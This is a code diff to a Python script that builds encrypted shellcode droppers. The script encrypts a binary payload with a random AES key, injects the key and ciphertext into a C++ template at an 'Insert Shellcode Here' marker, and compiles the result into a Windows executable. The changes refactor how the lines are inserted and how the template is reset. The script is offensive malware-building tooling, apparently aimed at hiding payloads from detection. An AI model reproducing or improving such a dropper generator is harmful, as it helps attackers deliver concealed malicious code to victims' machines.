@@ -10,7 +10,7 @@ import argparse
 
 SHELLCODE_MARK = "Insert Shellcode Here"
 archs = {"1":"x64", "2":"x86"}
-
+data = []
 
 def printS(text):
     print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
@@ -19,7 +19,7 @@ def printE(text):
 def printI(text):
     print(f"""{Fore.BLUE}[*]{Fore.WHITE} {text}""")
 
-def writeToFile(mark, data, i):
+def writeToFile(mark, data):
     # i is number of lines after mark. Starts from 0!
     line = True
     lineCount = 1
@@ -31,12 +31,14 @@ def writeToFile(mark, data, i):
             lineCount += 1
 
     targetLine = lineCount
-    with open("sources/code.cpp", "r") as a_file:
-        list_of_lines = a_file.readlines()
-        list_of_lines[targetLine + i] = f"        {data}\n"
+    for i in range(len(data)):
+        with open("sources/code.cpp", "r") as a_file:
+            list_of_lines = a_file.readlines()
+            list_of_lines[targetLine + i] = f"        {data[i]}\n"
 
-    with open("sources/code.cpp", "w") as a_file:
-        a_file.writelines(list_of_lines)
+        with open("sources/code.cpp", "w") as a_file:
+            a_file.writelines(list_of_lines)
+
 
 def encrypt(plaintext):
     KEY = get_random_bytes(16)
@@ -76,12 +78,16 @@ def main():
         sys.exit(1)
 
     printI(f"Generating {Arch} Dropper for {binaryName}")
-
+    
+    # Encrypt shellcode
     binaryKey, binaryPayload = encrypt(binaryData)
-    writeToFile(SHELLCODE_MARK, rf"// {binaryName}-{Arch}", 0)
-    writeToFile(SHELLCODE_MARK, f"unsigned char key[] = {binaryKey}", 1)
-    writeToFile(SHELLCODE_MARK, f"unsigned char shellcode[] = {binaryPayload}", 2)
-
+    
+    # Write data to cpp code
+    data.append(rf"// {binaryName}-{Arch}")
+    data.append(f"unsigned char key[] = {binaryKey}")
+    data.append(f"unsigned char shellcode[] = {binaryPayload}")
+    writeToFile(SHELLCODE_MARK, data)
+    
     # Compiling Code
     if Arch == "x64":
         outputFileName += "-64"
@@ -94,7 +100,10 @@ def main():
         printS(f"Code saved to output/{outputFileName}.cpp")
 
     printS(f"Executable saved to output/{outputFileName}.exe")
-    os.system("/usr/bin/cp sources/code.cpp.bak sources/code.cpp")
+    
+    # Cleaing up!
+    revertList = ['','','']
+    writeToFile(SHELLCODE_MARK, revertList)
 
 
 if __name__ == "__main__":
